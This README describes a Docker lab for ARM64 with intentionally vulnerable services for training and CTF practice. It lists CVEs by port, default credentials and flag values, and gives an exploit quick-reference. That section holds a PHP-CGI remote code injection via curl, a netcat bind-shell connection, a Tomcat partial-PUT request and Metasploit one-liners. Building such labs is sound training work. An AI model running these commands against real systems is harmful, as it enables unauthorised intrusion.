# Metasploitable3 ARM64 — Docker Lab

> ⚠️ **WARNING**: This container exposes **intentionally vulnerable** services.
> Use **EXCLUSIVELY** on isolated private networks for educational and CTF purposes.
> **NEVER expose to the internet or production networks.**

[![Docker Build](https://github.com/your-username/metasploitable3-arm/actions/workflows/docker-build.yml/badge.svg)](https://github.com/your-username/metasploitable3-arm/actions/workflows/docker-build.yml)
[![Tests](https://github.com/your-username/metasploitable3-arm/actions/workflows/tests.yml/badge.svg)](https://github.com/your-username/metasploitable3-arm/actions/workflows/tests.yml)

---

## Vulnerable Services & CVEs (up to May 2026)

| Port | Service | CVE | Severity | Description |
|------|---------|-----|----------|-------------|
| 21 | vsftpd | CVE-2011-2523 | CRITICAL | Backdoor — username `:)` triggers bind shell on port 6200 |
| 22 | OpenSSH | CVE-2024-6387 | CRITICAL | regreSSHion — signal handler race, unauthenticated RCE as root |
| 22 | OpenSSH | — | — | root:root credentials, `PermitRootLogin yes` |
| 80 | Apache 2 | CVE-2024-38474 | CRITICAL | mod_rewrite encoding substitution — CGI RCE via encoded path |
| 80 | PHP-CGI | CVE-2012-1823 | CRITICAL | PHP-CGI argument injection — `?-s` source disclosure, `?-d` RCE |
| 80 | DVWA | — | — | SQLi, XSS, CSRF, File Upload, Command Injection |
| 139/445 | Samba | CVE-2017-7494 | CRITICAL | SambaCry — .so from writable share → `is_known_pipename` RCE |
| 139/445 | Samba | CVE-2007-2447 | HIGH | username map script injection (simulated) |
| 3306 | MariaDB | CVE-2021-27928 | HIGH | `SET GLOBAL wsrep_provider` OS command injection |
| 3306 | MariaDB | UDF payload | HIGH | mysql_udf_payload — FILE priv + writable plugin dir → sys_exec() |
| 6200 | Backdoor | CVE-2011-2523 | CRITICAL | nc bind shell (vsftpd 2.3.4 functional emulation) |
| 8009 | Tomcat AJP | CVE-2020-1938 | CRITICAL | Ghostcat — AJP file read/inclusion → RCE |
| 8080 | Tomcat 9 | CVE-2025-24813 | CRITICAL | Partial PUT + Java deserialization — unauthenticated RCE |
| 8080 | Tomcat 9 | — | — | Manager app — `tomcat:tomcat` default credentials |
| 8585 | Apache | — | — | PHP RCE shell (`?cmd=id`) |

## CTF Flags

| Path | Flag |
|------|------|
| `/root/flag.txt` | `FLAG{root_owned_d4rk_pwn3d}` |
| `/var/www/html/flag.txt` | `FLAG{w3b_s3rv3r_c0mpr0m1s3d}` |
| `/srv/ftp/flag.txt` | `FLAG{ftp_anon_access_gr4nted}` |
| `/srv/samba/public/flag.txt` | `FLAG{smb_sh4r3_pwn3d}` |

---

## Requirements

- Docker Desktop 4.x+ with Buildx (Apple Silicon)
- Docker Compose v2+
- (Optional) Kali Linux ARM64 VM in UTM / Parallels / VMware Fusion

---

## Quick Start

```bash
git clone https://github.com/your-username/metasploitable3-arm.git
cd metasploitable3-arm
docker compose up -d
docker exec metasploitable3 supervisorctl status
```

---

## Build Multi-Platform Image (Docker Hub)

```bash
docker buildx create --name ms3-builder --use
docker buildx inspect --bootstrap

docker buildx build \
  --platform linux/arm64,linux/amd64 \
  -t your-username/metasploitable3-arm:latest \
  --push .
```

---

## Exploit Quick Reference (from Kali)

```bash
export TARGET=192.168.64.1   # Mac host IP (UTM) or 172.20.0.10 (bridge)

# --- CVE-2024-6387 regreSSHion ---
# PoC: https://github.com/l0n3m4n/CVE-2024-6387

# --- CVE-2011-2523 backdoor sim ---
nc $TARGET 6200              # direct shell

# --- CVE-2012-1823 PHP-CGI ---
curl "http://$TARGET/cgi-bin/php?-s"
curl "http://$TARGET/cgi-bin/php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  --data "<?php system('id'); ?>"

# --- CVE-2020-1938 Ghostcat ---
msfconsole -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS $TARGET; run"

# --- CVE-2025-24813 Tomcat partial PUT ---
curl -X PUT http://$TARGET:8080/uploads/shell.session \
  -H "Content-Range: bytes 0-3/8" -d $'\xac\xed\x00\x05'

# --- CVE-2017-7494 SambaCry ---
msfconsole -x "use exploit/linux/samba/is_known_pipename; set RHOSTS $TARGET; run"

# --- mysql_udf_payload ---
msfconsole -x "use exploit/multi/mysql/mysql_udf_payload; set RHOSTS $TARGET; set PASSWORD ''; run"

# --- Full nmap scan ---
nmap -sV -p 21,22,80,139,445,3306,6200,8009,8080,8585 $TARGET
```

---

## Gitflow Branch Structure

```
main       ← tagged releases (v1.0.0, v1.1.0)
develop    ← integration
feature/*  ← new services or vulnerabilities
release/*  ← release prep
hotfix/*   ← critical patches
```

## Running Tests

```bash
pip install -e ".[test]"
docker compose up -d && sleep 60
pytest tests/ -v
```

## Shutdown

```bash
docker compose down
```
